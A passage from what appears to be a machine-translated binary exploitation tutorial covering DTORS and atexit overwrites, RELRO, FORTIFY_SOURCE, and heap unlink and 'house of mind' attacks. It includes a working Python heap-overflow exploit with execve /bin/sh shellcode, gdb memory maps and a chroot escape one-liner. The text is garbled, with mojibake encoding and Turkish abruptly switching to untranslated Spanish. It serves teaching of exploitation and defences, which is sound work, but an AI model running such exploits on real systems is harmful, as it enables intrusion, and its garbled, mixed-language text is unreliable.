Genellikle **DTOR** bÃ¶lÃ¼mÃ¼nÃ¼ `ffffffff` ve `00000000` deÄŸerleri **arasÄ±nda** bulacaksÄ±nÄ±z. Bu yÃ¼zden sadece bu deÄŸerleri gÃ¶rÃ¼yorsanÄ±z, bu, **herhangi bir iÅŸlevin kaydedilmediÄŸi anlamÄ±na gelir**. Bu nedenle, **`00000000`** deÄŸerini **Ã¼zerine yazarak** onu Ã§alÄ±ÅŸtÄ±rmak iÃ§in **shellcode** adresiyle deÄŸiÅŸtirin.

### **Format Strings to Buffer Overflows**

**sprintf**, biÃ§imlendirilmiÅŸ bir dizeyi bir **deÄŸiÅŸkene taÅŸÄ±r**. Bu nedenle, bir dizenin biÃ§imlendirmesini **kullanarak**, iÃ§eriÄŸin kopyalandÄ±ÄŸÄ± deÄŸiÅŸkende bir **tampon taÅŸmasÄ±na neden olabilirsiniz**.\
Ã–rneÄŸin, yÃ¼k `%.44xAAAA`, deÄŸiÅŸkene **44B+"AAAA" yazacaktÄ±r**, bu da bir tampon taÅŸmasÄ±na neden olabilir.

### **\_\_atexit YapÄ±larÄ±**

{% hint style="danger" %}
BugÃ¼nlerde bunu **saldÄ±rmak Ã§ok garip**.
{% endhint %}

**`atexit()`**, **parametre olarak baÅŸka iÅŸlevlerin geÃ§irildiÄŸi bir iÅŸlevdir**. Bu **iÅŸlevler**, bir **`exit()`** veya **main**'in **dÃ¶nÃ¼ÅŸÃ¼** sÄ±rasÄ±nda **Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r**.\
Bu iÅŸlevlerden herhangi birinin adresini Ã¶rneÄŸin bir shellcode'a yÃ¶nlendirebilirseniz, **iÅŸlemi kontrol edersiniz**, ancak bu ÅŸu anda daha karmaÅŸÄ±ktÄ±r.\
Åu anda **Ã§alÄ±ÅŸtÄ±rÄ±lacak iÅŸlevlerin adresleri** birkaÃ§ yapÄ± arkasÄ±nda gizlenmiÅŸtir ve sonunda iÅŸlevlerin adresleri deÄŸil, **XOR ile ÅŸifrelenmiÅŸ ve rastgele bir anahtarla kaydÄ±rÄ±lmÄ±ÅŸtÄ±r**. Bu nedenle, bu saldÄ±rÄ± vektÃ¶rÃ¼ ÅŸu anda **en azÄ±ndan x86** ve **x64\_86** iÃ§in Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir.\
**Åifreleme iÅŸlevi** **`PTR_MANGLE`**'dÄ±r. m68k, mips32, mips64, aarch64, arm, hppa gibi **diÄŸer mimariler**, girdi olarak aldÄ±ÄŸÄ± gibi **ÅŸifrelemeyi uygulamaz**. Bu nedenle, bu mimariler bu vektÃ¶r tarafÄ±ndan saldÄ±rÄ±ya uÄŸrayabilir.

### **setjmp() & longjmp()**

{% hint style="danger" %}
BugÃ¼nlerde bunu **saldÄ±rmak Ã§ok garip**.
{% endhint %}

**`Setjmp()`**, **baÄŸlamÄ± (kayÄ±tlarÄ±) kaydetmeyi saÄŸlar**\
**`longjmp()`**, **baÄŸlamÄ± geri yÃ¼klemeyi saÄŸlar**.\
Kaydedilen kayÄ±tlar: `EBX, ESI, EDI, ESP, EIP, EBP`\
Olan ÅŸudur ki EIP ve ESP, **`PTR_MANGLE`** iÅŸlevi tarafÄ±ndan geÃ§irilir, bu nedenle **bu saldÄ±rÄ±ya duyarlÄ± mimariler yukarÄ±dakiyle aynÄ±dÄ±r**.\
Hata kurtarma veya kesmeler iÃ§in kullanÄ±ÅŸlÄ±dÄ±r.\
Ancak okuduklarÄ±ma gÃ¶re, diÄŸer kayÄ±tlar korunmamaktadÄ±r, bu nedenle, Ã§aÄŸrÄ±lan iÅŸlevin iÃ§inde `call ebx`, `call esi` veya `call edi` varsa kontrol ele geÃ§irilebilir. Veya EBP deÄŸiÅŸtirilerek ESP deÄŸiÅŸtirilebilir.

**VTable ve VPTR in C++**

Her sÄ±nÄ±fÄ±n bir **Vtable**'Ä± vardÄ±r, bu bir **yÃ¶ntemler dizisidir**.

Her bir **sÄ±nÄ±fÄ±n nesnesi**, sÄ±nÄ±fÄ±nÄ±n dizisinin bir **iÅŸaretÃ§isi olan bir VPtr'ye** sahiptir. VPtr, her nesnenin baÅŸlÄ±ÄŸÄ±nÄ±n bir parÃ§asÄ±dÄ±r, bu nedenle VPtr'nin **Ã¼zerine yazÄ±lmasÄ± baÅŸarÄ±lÄ± olursa**, bir iÅŸlevi Ã§alÄ±ÅŸtÄ±rmak iÃ§in VPtr'nin bir sahte yÃ¶nteme **yÃ¶nlendirilmesi** mÃ¼mkÃ¼n olabilir ve bu da shellcode'a gidebilir.

## **Ã–nleyici ve KaÃ§Ä±nma Ã–nlemleri**

**Printf'e Return**

Bir tampon taÅŸmasÄ±nÄ± bir biÃ§im dizesi hatasÄ±na dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in bir tekniktir. EIP'yi bir iÅŸlevin printf'ine yÃ¶nlendirmek ve iÅŸlem durumu hakkÄ±nda deÄŸerler elde etmek iÃ§in manipÃ¼le edilmiÅŸ bir biÃ§im dizesini argÃ¼man olarak geÃ§irmekten oluÅŸur.

**KÃ¼tÃ¼phanelere SaldÄ±rÄ±**

KÃ¼tÃ¼phaneler, 16 bit rastgelelikle bir konumda bulunur = 65636 olasÄ± adres. Bir sunucu saldÄ±rÄ±ya uÄŸrayabilirse fork() Ã§aÄŸrÄ±sÄ± yaparsa, bellek adresleri alanÄ± Ã§ocuk sÃ¼reÃ§te kopyalanÄ±r ve deÄŸiÅŸmez. Bu nedenle, libc'nin usleep() iÅŸlevine brute force saldÄ±rÄ±sÄ± yapÄ±labilir, "16" argÃ¼manÄ± olarak geÃ§irilerek normalden daha uzun sÃ¼rede yanÄ±t verirse, bu iÅŸlev bulunmuÅŸ olur. Bu iÅŸlevin nerede olduÄŸunu bildiÄŸinizde delta_mmap alÄ±nabilir ve diÄŸerleri hesaplanabilir.

ASLR'nin Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndan emin olmanÄ±n tek yolu 64 bit mimarisini kullanmaktÄ±r. Burada brute force saldÄ±rÄ±larÄ± yoktur.

### Relro

**Relro (Salt Okunur Yer DeÄŸiÅŸtirme)**, bellek izinlerini NX ile benzer ÅŸekilde etkiler. Fark, NX ile yÄ±ÄŸÄ±nÄ± yÃ¼rÃ¼tÃ¼lebilir hale getirirken, RELRO **belirli ÅŸeyleri salt okunur hale getirir**, bÃ¶ylece **onlara yazamayÄ±z**. Bu genellikle bir **`got` tablosu Ã¼zerine yazma** iÅŸlemini yapamamamÄ±zÄ± engelleyen en yaygÄ±n engel olarak karÅŸÄ±ma Ã§Ä±ktÄ±. `got` tablosu, libc iÅŸlevlerinin adreslerini tutar, bÃ¶ylece ikili dosya bu adresleri bilir ve onlarÄ± Ã§aÄŸÄ±rabilir. Bir ikili dosya iÃ§in `got` tablosu giriÅŸi iÃ§in bellek izinlerinin nasÄ±l olduÄŸuna bakalÄ±m. RELRO ile:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Relro olmadan:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Binary **relro olmadan**, `fgets` iÃ§in `got` giriÅŸ adresinin `0x404018` olduÄŸunu gÃ¶rebiliriz. Bellek eÅŸlemelerine baktÄ±ÄŸÄ±mÄ±zda, bu adresin `0x404000` ile `0x405000` arasÄ±nda olduÄŸunu gÃ¶rÃ¼yoruz, bu da **izinlerin `rw`** olduÄŸu anlamÄ±na gelir, yani okuma ve yazma yapabiliriz. **relro ile** binary iÃ§in, binary'nin Ã§alÄ±ÅŸtÄ±rÄ±lma sÄ±rasÄ±ndaki `got` tablosu adresinin (pie etkin olduÄŸundan bu adres deÄŸiÅŸecektir) `0x555555557fd0` olduÄŸunu gÃ¶rÃ¼yoruz. Bu binary'nin bellek eÅŸlemesinde, `0x0000555555557000` ile `0x0000555555558000` arasÄ±nda dÃ¼ÅŸer, bu da bellek **izininin `r`** olduÄŸu anlamÄ±na gelir, yani sadece okuyabiliriz.

Peki **atlatma** nedir? KullandÄ±ÄŸÄ±m tipik atlatma, relro'nun okunabilir olmasÄ±na neden olduÄŸu bellek bÃ¶lgelerine yazmamak ve **kod yÃ¼rÃ¼tme iÃ§in farklÄ± bir yol bulmaktÄ±r**.

Bunun gerÃ§ekleÅŸmesi iÃ§in binary'nin yÃ¼rÃ¼tÃ¼lmeden Ã¶nce fonksiyonlarÄ±n adreslerini bilmesi gerekir:

* Tembel baÄŸlama: Bir fonksiyonun adresi ilk kez Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda aranÄ±r. Bu nedenle, GOT'un yÃ¼rÃ¼tme sÄ±rasÄ±nda yazma izinlerine sahip olmasÄ± gerekir.
* Åimdi baÄŸla: FonksiyonlarÄ±n adresleri yÃ¼rÃ¼tmenin baÅŸlangÄ±cÄ±nda Ã§Ã¶zÃ¼lÃ¼r, ardÄ±ndan .got, .dtors, .ctors, .dynamic, .jcr gibi hassas bÃ¶lÃ¼mlere salt okunur izinler verilir. `` `** ``-z relro`**`y`**`-z now\`\*\*

Bir programÄ±n Åimdi baÄŸlama kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in ÅŸunu yapabilirsiniz:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando el binario es cargado en memoria y una funciÃ³n es llamada por primera vez se salta a la PLT (Procedure Linkage Table), de aquÃ­ se realiza un salto (jmp) a la GOT y descubre que esa entrada no ha sido resuelta (contiene una direcciÃ³n siguiente de la PLT). Por lo que invoca al Runtime Linker o rtfd para que resuelva la direcciÃ³n y la guarde en la GOT.

Cuando se llama a una funciÃ³n se llama a la PLT, esta tiene la direcciÃ³n de la GOT donde se almacena la direcciÃ³n de la funciÃ³n, por lo que redirige el flujo allÃ­ y asÃ­ se llama a la funciÃ³n. Sin embargo, si es la primera vez que se llama a la funciÃ³n, lo que hay en la GOT es la siguiente instrucciÃ³n de la PLT, por lo tanto el flujo sigue el cÃ³digo de la PLT (rtfd) y averigua la direcciÃ³n de la funciÃ³n, la guarda en la GOT y la llama.

Al cargar un binario en memoria el compilador le ha dicho en quÃ© offset tiene que situar datos que se deben de cargar cuando se corre el programa.

Lazy binding â€”> La direcciÃ³n de la funciÃ³n se busca la primera vez que se invoca dicha funciÃ³n, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ahÃ­ y no haya que volver a buscarla.

Bind now â€”> Las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura. **-z relro** y **-z now**

A pesar de esto, en general los programas no estÃ¡n complicados con esas opciones luego estos ataques siguen siendo posibles.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** â€”> Para saber si usan el BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 o =2**

Trata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la funciÃ³n por una funciÃ³n segura.

Por ej:\
char buf\[16];\
strcpy(but, source);

La identifica como insegura y entonces cambia strcpy() por \_\_strcpy\_chk() utilizando el tamaÃ±o del buffer como tamaÃ±o mÃ¡ximo a copiar.

La diferencia entre **=1** o **=2** es que:

La segunda no permite que **%n** venga de una secciÃ³n con permisos de escritura. AdemÃ¡s el parÃ¡metro para acceso directo de argumentos solo puede ser usado si se usan los anteriores, es decir, solo se pueda usar **%3$d** si antes se ha usado **%2$d** y **%1$d**

Para mostrar el mensaje de error se usa el argv\[0], por lo que si se pone en el la direcciÃ³n de otro sitio (como una variable global) el mensaje de error mostrarÃ¡ el contenido de dicha variable. Pag 191

**Reemplazo de Libsafe**

Se activa con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No estÃ¡ estandarizado. (solo para x86, no para compilaxiones con -fomit-frame-pointer, no compilaciones estaticas, no todas las funciones vulnerables se vuelven seguras y LD\_PRELOAD no sirve en binarios con suid).

**ASCII Armored Address Space**

Consiste en cargar las librerÃ­a compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ningÃºn ataque, y menos en little endian.

**ret2plt**

Consiste en realiza un ROP de forma que se llame a la funciÃ³n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funciÃ³n a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2Âºbyte de system()â€¦ Al final se llama la direcciÃ³n guardada en GOT que serÃ¡ system()

**Falso EBP**

Para las funciones que usen el EBP como registro para apuntar a los argumentos al modificar el EIP y apuntar a system() se debe haber modificado el EBP tambiÃ©n para que apunte a una zona de memoria que tenga 2 bytes cuales quiera y despuÃ©s la direcciÃ³n a &â€/bin/shâ€.

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user â€”> Instala un sistema bÃ¡sico bajo un subdirectorio especÃ­fico

Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

**InstrumentaciÃ³n de cÃ³digo**

Valgrind â€”> Busca errores\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits bÃ¡sicos**

**Trozo asignado**

prev\_size |\
size | â€”Cabecera\
\*mem | Datos

**Trozo libre**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk â€”Cabecera\
\*mem | Datos

Los trozos libres estÃ¡n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)

En â€œsizeâ€ hay bits para indicar: Si el trozo anterior estÃ¡ en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.

Si al liberar un trozo alguno de los contiguos se encuentra libre , estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo mÃ¡s grande a frontlink() para que le inserte el bin adecuado.

unlink(){\
BK = P->bk; â€”> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD = P->fd; â€”> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD->bk = BK; â€”> El BK del siguiente chunk apunta al nuevo chunk\
BK->fd = FD; â€”> El FD del anterior chunk apunta al nuevo chunk\
}

Por lo tanto si conseguimos modificar el P->bk con la direcciÃ³n de un shellcode y el P->fd con la direcciÃ³n a una entrada en la GOT o DTORS menos 12 se logra:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Y asÃ­ se se ejecuta al salir del programa la shellcode.

AdemÃ¡s, la 4Âº sentencia de unlink() escribe algo y la shellcode tiene que estar reparada para esto:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Esto provoca la escritura de 4 bytes a partir del 8Âº byte de la shellcode, por lo que la primera instrucciÃ³n de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.

Por lo tanto el exploit se crea:

En el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.

DespuÃ©s de la shell code metemos relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev\_size para que tenga el bit que dice que estÃ¡ libre) y â€œ-4â€œ(0xfffffffc) en el size (para que cuando compruebe en el 3Âº trozo si el 2Âº estaba libre en realidad vaya al prev\_size modificado que le dirÃ¡ que sÂ´estÃ¡ libre) -> AsÃ­ cuando free() investigue irÃ¡ al size del 3Âº pero en realidad irÃ¡ al 2Âº - 4 y pensarÃ¡ que el 2Âº trozo estÃ¡ libre. Y entonces llamarÃ¡ a **unlink()**.

Al llamar a unlink() usarÃ¡ como P->fd los primeros datos del 2Âº trozo por lo que ahÃ­ se meterÃ¡ la direcciÃ³n que se quieres sobreescribir - 12(pues en FD->bk le sumarÃ¡ 12 a la direcciÃ³n guardada en FD) . Y en esa direcciÃ³n introducirÃ¡ la segunda direcciÃ³n que encuentre en el 2Âº trozo, que nos interesarÃ¡ que sea la direcciÃ³n a la shellcode(P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Ã–nemli olan Ã¶nceki parÃ§anÄ±n boÅŸ olduÄŸunu gÃ¶steren bitin 1 olmasÄ±dÄ±r**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, 3. parÃ§anÄ±n "size" deÄŸerinin 4 byte geride olduÄŸunu dÃ¼ÅŸÃ¼nmesi iÃ§in (prev\_size'ye iÅŸaret eder)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Payload'da baÅŸlangÄ±Ã§ta 8 byte dolgu ekleyeceÄŸiz**

**got\_free = pack("\<I", 0x08048300 - 12) #free() adresi plt-12 (free ikinci kez Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda shellcode'un Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ± adresi Ã¼zerine yazacak olan adres)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Payload, 8 byte dolgu ile baÅŸlar Ã§Ã¼nkÃ¼ Ã¶yle sÃ¶ylendi**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2. parÃ§a deÄŸiÅŸtirilir, got\_free, addr\_sc + 12 adresini kaydedeceÄŸimiz yere iÅŸaret eder**

**os.system("./8.3.o " + payload)**

**unset() ters sÄ±rayla serbest bÄ±rakma (wargame)**

ÃœÃ§ ardÄ±ÅŸÄ±k parÃ§ayÄ± kontrol ediyoruz ve rezerve edildikleri sÄ±rayla serbest bÄ±rakÄ±lÄ±yorlar.

Bu durumda:

ParÃ§a c'ye shellcode yerleÅŸtirilir

ParÃ§a a, b'yi Ã¼zerine yazmak iÃ§in kullanÄ±lÄ±r, bÃ¶ylece boyutunun PREV\_INUSE biti devre dÄ±ÅŸÄ± bÄ±rakÄ±lÄ±r ve parÃ§a a'nÄ±n boÅŸ olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼r.

AyrÄ±ca, baÅŸlÄ±k b'de boyut -4 olacak ÅŸekilde Ã¼zerine yazÄ±lÄ±r.

SonuÃ§ olarak, program "a"nÄ±n boÅŸ olduÄŸunu ve bir binde olduÄŸunu dÃ¼ÅŸÃ¼necek ve onu ayÄ±rmak iÃ§in unlink() Ã§aÄŸrÄ±sÄ± yapacaktÄ±r. Ancak, Ã§Ã¼nkÃ¼ baÅŸlÄ±k PREV\_SIZE -4'e eÅŸit, program "a" parÃ§asÄ±nÄ±n aslÄ±nda b+4'te baÅŸladÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼necektir. Yani, b+4'te bir unlink() yapacak ve b+12'de "fd" iÅŸaretÃ§isi, b+16'da "bk" iÅŸaretÃ§isi olacaktÄ±r.

Bu ÅŸekilde, bk'ya shellcode adresini ve fd'ye "puts()" fonksiyonunun adresini -12 olarak yerleÅŸtirirsek payloadumuzu elde ederiz.

**Frontlink TekniÄŸi**

Bir ÅŸey serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda ve yanÄ±ndaki parÃ§alar boÅŸ deÄŸilse, unlink() Ã§aÄŸrÄ±lmaz, doÄŸrudan frontlink() Ã§aÄŸrÄ±lÄ±r.

SaldÄ±rÄ±lan malloc hiÃ§bir zaman serbest bÄ±rakÄ±lmazsa yararlÄ± bir zayÄ±flÄ±ktÄ±r.

Gereksinimler:

Veri giriÅŸi iÅŸleviyle taÅŸÄ±nabilir bir tampon

Bu tampona bitiÅŸik serbest bÄ±rakÄ±lacak ve baÅŸlÄ±k fd alanÄ± taÅŸÄ±nma ile deÄŸiÅŸtirilecek bir tampon

512'den bÃ¼yÃ¼k ancak Ã¶nceki tampona gÃ¶re kÃ¼Ã§Ã¼k bir boyutta serbest bÄ±rakÄ±lacak bir tampon

Bu adÄ±mdan Ã¶nce tanÄ±mlanmÄ±ÅŸ bir tampon, bu tamponun prev\_size'Ä±nÄ± Ã¼zerine yazmaya izin verir

Bu ÅŸekilde, kontrolsÃ¼z iki malloc Ã¼zerine yazarak ve sadece birinin serbest bÄ±rakÄ±lmasÄ±nÄ± saÄŸlayarak bir saldÄ±rÄ± gerÃ§ekleÅŸtirebiliriz.

**Ã‡ift free() ZayÄ±flÄ±ÄŸÄ±**

AynÄ± iÅŸaretÃ§iyle iki kez free() Ã§aÄŸrÄ±lÄ±rsa, iki bin aynÄ± adrese iÅŸaret eder.

Birini tekrar kullanmak istendiÄŸinde sorunsuzca atanÄ±r. DiÄŸerini kullanmak istendiÄŸinde, Ã¶nceki rezervasyonun yazdÄ±ÄŸÄ± verilerle "fd" ve "bk" iÅŸaretÃ§ileri yanÄ±ltÄ±lÄ±r.

**Free() SonrasÄ±**

Ã–nceden serbest bÄ±rakÄ±lan bir iÅŸaretÃ§i kontrolsÃ¼z bir ÅŸekilde yeniden kullanÄ±lÄ±r.

## **8 Heap TaÅŸmalarÄ±: GeliÅŸmiÅŸ SaldÄ±rÄ±lar**

Unlink() ve FrontLink() teknikleri unlink() iÅŸlevi deÄŸiÅŸtirilerek kaldÄ±rÄ±ldÄ±.

**The house of mind**

Kodun keyfi olarak yÃ¼rÃ¼tÃ¼lmesi iÃ§in sadece bir free() Ã§aÄŸrÄ±sÄ± gereklidir. Ã–nce birinci parÃ§ayÄ± taÅŸÄ±rabilecek ve serbest bÄ±rakÄ±lacak ikinci bir parÃ§a bulunmalÄ±dÄ±r.

Bir free() Ã§aÄŸrÄ±sÄ±, public\_fREe(mem) iÅŸlevini Ã§aÄŸÄ±rÄ±r, bu iÅŸlev:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Bir parÃ§anÄ±n baÅŸladÄ±ÄŸÄ± adresi (mem-8) dÃ¶ndÃ¼rÃ¼r

â€¦

ar\_ptr = arena\_for_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

\[1] kÄ±smÄ±nda size alanÄ± NON\_MAIN\_ARENA bitini kontrol eder, bu deÄŸeri deÄŸiÅŸtirerek kontrolÃ¼ true yapabilir ve heap\_for\_ptr() iÅŸlevini Ã§alÄ±ÅŸtÄ±rabiliriz. Bu iÅŸlev, "mem" Ã¼zerinde bir and iÅŸlemi yaparak en az anlamlÄ± 2.5 byte'Ä± sÄ±fÄ±rlar (Ã¶rneÄŸin 0x0804a000'den 0x08000000'e) ve 0x08000000->ar\_ptr adresine eriÅŸir (struct heap\_info gibi).

Bu ÅŸekilde, Ã¶rneÄŸin 0x0804a000 adresinde bir parÃ§ayÄ± kontrol edebilir ve **0x081002a0** adresinde bir parÃ§a serbest bÄ±rakÄ±lÄ±yorsa 0x08100000 adresine ulaÅŸabilir ve istediÄŸimiz ÅŸeyi, Ã¶rneÄŸin **0x0804a000** adresini yazabiliriz. Bu ikinci parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, heap\_for\_ptr(ptr)->ar\_ptr'Ä±n 0x08100000 adresinde yazdÄ±ÄŸÄ±mÄ±zÄ± gÃ¶recektir (Ã§Ã¼nkÃ¼ Ã¶nce bahsettiÄŸimiz and iÅŸlemi uygulanÄ±r ve buradan ilk 4 byte'Ä±n deÄŸeri alÄ±nÄ±r, yani ar\_ptr).

Bu ÅŸekilde \_int\_free(ar\_ptr, mem) Ã§aÄŸrÄ±lÄ±r, yani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Daha Ã¶nce av deÄŸerini kontrol edebildiÄŸimiz iÃ§in, serbest bÄ±rakÄ±lacak parÃ§anÄ±n Ã¼zerine yazdÄ±ÄŸÄ±mÄ±z deÄŸerdir.

Unsorted\_chunks'Ä± tanÄ±mladÄ±ÄŸÄ±mÄ±z gibi biliyoruz ki:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
